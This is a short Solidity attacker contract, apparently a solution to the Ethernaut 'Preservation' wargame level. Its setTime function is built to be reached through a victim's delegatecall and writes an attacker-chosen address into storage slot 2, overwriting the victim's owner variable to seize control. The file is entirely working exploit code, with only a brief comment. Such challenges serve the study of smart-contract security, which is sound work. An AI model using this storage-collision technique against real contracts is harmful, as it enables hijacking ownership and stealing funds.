// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract PreservationHackDan {
    address immutable EOA_ADDRESS;

    constructor(address _eoaAddress) {
        EOA_ADDRESS = _eoaAddress;
    }

    /**
     * This is going to be called with a delegatecall
     * Since EOA_ADDRESS isn't stored in storage, its value will be the same
     * no matter who calls it. 
     */
    function setTime(uint256) external {
        address toSet = EOA_ADDRESS;

        assembly {
            sstore(2, toSet)
        }
    }
}